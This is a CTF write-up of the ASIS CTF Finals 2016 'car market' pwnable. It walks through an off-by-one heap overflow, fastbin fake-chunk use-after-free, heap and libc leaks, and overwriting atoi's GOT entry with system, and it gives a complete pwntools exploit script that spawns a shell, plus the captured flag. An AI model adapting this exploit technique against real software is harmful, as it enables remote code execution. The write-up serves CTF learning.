---
title: ASIS CTF Finals 2016 -- car market
tags:
  - CTF
  - Pwnable
  - ASIS
  - Python
  - use_after_free
  - heap
  - off-by-one
categories:
  - write-ups
date: 2016-09-13 08:54:00
---
**Category:** pwn
**Points:** 177  

<!-- more -->    
  
64 bit ELF, with **Partial RELRO, Canary & NX enabled, no PIE**. `libc.so` was provided.  

The binary is a car market program. It will let us list our cars' info, add a car, remove a car and select a car. By selecting a car, we can edit our car model, price and add a customer. While adding a customer, we can set the customer's name, comment and print out the customer's info. The `car` and `customer` are defined as the following structures:  
```c car
struct car{
  char model[16];
  long price;
  struct customer* customer;
};
```
```c customer  
struct customer{
  char first_name[32];
  char name[32];
  char* comment; // buffer size: 0x48
};
```
  
After doing some reversing & fuzzing, here's some important program behavior:  
  
* There's a pointer `struct car** ptr`. The program will first use `malloc` to allocate a buffer and assigned to `ptr`, which use the buffer to store the `car*` array.  
* Each time we add a customer to a car, the program will first check if `car->customer` and `car->customer->comment` were exist in the car. If it does, the program will free `car->customer` and `car->customer->comment`, ensure that there's only one customer in the car.  
* There exist multiple **off-by-one** vulnerabilities while the program try to read the user input. When we input the `model`, `first_name` and the `name` data, we can trigger the vulnerability by entering a long length data. **This will cause the first byte of the next data be overwritten to a null byte.**    
  
The first thing I try to do is to leak some address. I found that if we do the following operation, we can leak heap's base address:  

1. Enter the customer menu
2. Exit the customer menu
3. Enter the customer menu again  
4. Print out the customer info, the customer's first name will become a heap address  
  
This is because the program will try to free the memory of `car->customer` before we try to enter the customer menu for the second time. After `car->customer` was freed, its memory chunk's fd (**which is also `car->customer->first_name`**) will be storing the next free chunk's address, so by printing out the customer's info , we can leak out the heap's address.  
  
The next thing is to leak out the libc's address. To achieve this, I decide to corrupted fastbin by exploiting the off-by-one vulnerability. Assume that we have the following memory layout of a `car->customer` structure:  
<pre>
             +------------------+
customer     |........first_name| char first_name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+32  |..............name| char name[32]
             |..................|
             |..................|
             |..................|
             +------------------+
customer+64  |        0x12345680| char* comment
             +------------------+
</pre>  
  
By using the off-by-one vulnerability on `car->customer->name`, **we can overwrite the last byte of `comment`'s address, change it from `0x12345680` to `0x12345600`**. Now if we exit & re-enter the customer menu, the program will try to free `car->customer->comment`, which is `0x12345600` instead of `0x12345680`.  

Now if we have the memory layout of a `car` structure like this:  
<pre>  
                      +------------------+
    car    0x123455F0 |               0x0| char model[16]
                      +------------------+
                      |              0x51|
                      +------------------+
    car+16 0x12345600 |              0x64| long price
                      +------------------+
    car+24 0x12345608 |        0x12348880| struct customer* customer
                      +------------------+
</pre>  
  
By setting the model of the car, we can fake the chunk's header, so when glibc's freeing `0x12345600`, it will think that it is freeing a memory chunk with the size of `0x50`, **the same size as `car->customer->comment`**, and add `0x12345600` into fastbin. This will create an **Use-After-Free** situation, with `0x12345600` being a dangling pointer. The next time we create a customer comment, the program will allocate `0x12345600` as the comment buffer, **and thus we can modify the structure of `car`, changing the `car->customer` pointer to `atoi`'s GOT**. After that, we can leak `atoi`'s GOT by printing the `car`'s info. 

To summarize, the following steps will help us leak out the libc's address:  
 
1. Add a couple of cars, try to make a `car`'s address ends with the `0xf0` byte (ex. `0x123455f0`), and put the fake chunk header in `car->model`.  
2. Exploit the off-by-one vulnerability, overwrite a `comment`'s buffer address. (ex. `0x12345680` -> `0x12345600`)  
3. Exit & re-enter the customer menu, so the program will free the fake `comment`'s address.  
4. Create a new `comment`, the new `comment`'s buffer will be overlapped with one of those `car`'s memory chunk. 
5. Edit `comment` and modify the `car`'s structure, change the `car->customer` pointer to `atoi`'s GOT.  
6. Print out the `car`'s info, leak `atoi`'s GOT and get the libc's address.  
  
Now we have the libc's address. Since the GOT entries are writable, we can try to overwrite `atoi`'s GOT into `system`'s address and do the GOT hijacking. At first I try to overwrite the GOT by using the same method as I leak `atoi`'s GOT -- after we change the `customer` pointer, we can overwrite the GOT entry by modifying `customer->first_name`.

Except we can't. That's because when we try to do so, the program will try to free `car->customer` before we enter the customer menu, **and doing `free(atoi@got.plt)` will crash the program**. We'll have to find another way to overwrite the GOT. So how are we gonna do that? Well, **remember the `ptr` variable?** The pointer that points to the `car*` array?  

Since we can modify a `car`'s structure by editing the comment, we can once again modify `car->customer`, changing the pointer to `ptr`, so when the program free `car->customer`, **it will free the whole `car*` array instead.** When the next time we create a new comment, it will allocate the memory by splitting the memory chunk from `ptr`, **making us able to control the `car*` array.** We can then overwrite the `car` pointer into `atoi`'s GOT by editing the comment. Once the `car` pointer is changed, we can overwrite the content by setting `car->model`, and that's how we hijack `atoi`'s GOT.  
  
So after we leak the libc's address:  
  
1. Edit `comment` and modify the `car`'s structure, change the `car->customer` pointer to `ptr`.  
2. Exit & re-enter the customer menu, so the program will free the fake `car->customer`'s address.  
3. Create a new `comment`, the new `comment`'s buffer will be overlapped with the `car*` array.  
4. Edit `comment` and modify the `car` pointer, change it to `atoi`'s GOT.  
5. Overwrite `atoi`'s GOT to `system`'s address by setting `car->model`.  

At last, when the program ask us to input our choice, we can input `sh\x00` and execute `system('sh')`, spawning a shell and get the flag...right?  
  
```python exp_car.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "car-market.asis-ctf.ir"
PORT = 31337
ELF_PATH = "./car_market"
#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
LIBC_PATH = "./car_libc.so.6"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def add_car(model, price):
    r.sendlineafter(">\n", "2")
    r.sendlineafter("model\n", model)
    r.sendlineafter("price\n", str(price))

def sel_car_cust(idx, cust_zip):
    r.sendlineafter(">\n", "4")
    r.sendlineafter("index\n", str(idx))
    r.sendlineafter(">\n", "4")

    for (choice, data) in cust_zip:
        r.sendlineafter(">\n", str(choice))
        r.sendlineafter(": \n", data)
    
    r.sendlineafter(">\n", "4") # exit cust mode

def leak_heap(idx):
    r.sendlineafter(">\n", "4")
    r.sendlineafter("index\n", str(idx))
    r.sendlineafter(">\n", "4") # add cust
    r.sendlineafter(">\n", "3") # add com
    r.sendlineafter(": \n", "123") # input com
    r.sendlineafter(">\n", "4") # exit cust
    r.sendlineafter(">\n", "4") # add cust
    r.sendlineafter(">\n", "4") # exit cust
    r.sendlineafter(">\n", "1") # list
    r.recvuntil("Firstname : ")
    heap_base = u64(r.recvline().strip().ljust(8, "\x00")) - 0xb90
    r.sendlineafter(">\n", "5")

    return heap_base

def leak_got(idx):
    r.sendlineafter(">\n", "4")
    r.sendlineafter("index\n", str(idx))
    r.sendlineafter(">\n", "1")
    r.recvuntil("Firstname : ")
    atoi_addr = u64(r.recv(6).ljust(8, "\x00"))
    log.success("atoi_addr: "+hex(atoi_addr))
    libc.address += atoi_addr - libc.symbols['atoi']
    r.sendlineafter(">\n", "5")


if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)
    
    for i in xrange(17):
        model = chr(ord("a")+i)*4
        price = 100+i
        log.info("add car: "+str(i))
        if i == 15: # fake chunk
            model = p64(0) + p64(0x51)
            price = 0x1111
        add_car(model, price)

    # leak heap base
    log.info("leaking heap base...")
    heap_base = leak_heap(16)
    log.success("heap_base: "+hex(heap_base))

    # overflow one byte of heap address
    log.info("overflowing heap address...")
    choice = [3, 1]
    data   = ["comment", "A"*33]
    sel_car_cust(16, zip(choice, data))   
    
    # add comment and overwrite customer pointer, change it to atoi@got.plt
    log.info("modifying car 15 struct (for leaking got)...")
    r.sendlineafter(">\n", "4") # add customer
    r.sendlineafter(">\n", "3") # add comment
    r.sendlineafter(": \n", p64(0x1111) + p64(elf.got['atoi']))
    r.sendlineafter(">\n", "4") # exit customer menu
    r.sendlineafter(">\n", "5") # exit select car menu
    
    # leak atoi's got
    log.info("leaking atoi's got & libc base...")
    leak_got(15)
    system = libc.symbols['system']
    log.success("libc base: "+hex(libc.address))
    log.success("system: "+hex(system))

    # overwrite customer pointer to heap_base+0x10
    log.info("modifying car 15 struct (for corrupting car array)...")
    choice = [3]
    data   = [p64(0x1111) + p64(heap_base+0x10)]
    sel_car_cust(16, zip(choice, data))   
    r.sendlineafter(">\n", "5") # exit select car menu

    # free & reallocate heap_base+0x10 , now we can control the car array 
    # after we control the car array, overite car[14] and make it point to atoi's got
    log.info("modifying car array...")
    choice = [3]
    data   = ["A"*0x20+p64(elf.got['atoi'])]
    sel_car_cust(15, zip(choice, data))   
    r.sendlineafter(">\n", "5") # exit select car menu
    
    # overwrite atoi's got
    log.info("overwriting atoi's got...")
    r.sendlineafter(">\n", "4") # select car
    r.sendlineafter("index\n", "14") # input index
    r.sendlineafter(">\n", "2") # set model (atoi's got)
    r.sendlineafter("model\n", p64(system))
    r.sendline("sh\x00")

    log.success("get shell !")
    r.interactive()

```
  
After I finished the exploit, I found it once again, the exploit has timeout due to the crappy internet connection. So I upload the exploit to trello and ask **freetsubasa** if she can send the payload for me. And then she told me that **she had the shell spawned, but she can't find the flag.** What ?  
```
$ ls -la
total 40
drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -> /dev/null
-rw-r--r-- 1 root marketpwn   220 Sep  8 09:51 .bash_logout
-rw-r--r-- 1 root marketpwn  3771 Sep  8 09:51 .bashrc
-rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
-r--r----- 1 root marketpwn    39 Sep  8 09:57 ._flag
-rw-r--r-- 1 root marketpwn   655 Sep  8 09:51 .profile
-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
```
OK, so the ASIS organizer try to play some trick on us. It's alright, no big deal, just give us the flag so we can pass the challenge.  
```
$ cat ._flag
cat: ._flag: No such file or directory
```
WHAT. THE. F\*CK.  

How is this even possible? The file is just right there and now you're telling me the file does not exist? This is bullsh*t !@#$%^&  
  
So after we have the shell, we spent another 30 minutes trying to figure out how to read the god damn flag. After some trial & error, teammate **ddaa** finally get the flag by using the `cat .*` command. It's strange because I've tried `for f in .*;do cat $f;done` and it failed, don't know why **:/**  

Anyway we finally got the flag and the 177 points. The binary itself was a great challenge, but the command line one was kind of evil **-.-**  
  
flag: `ASIS{a0b8813fc566836c8b5f37fe68c684c5}`
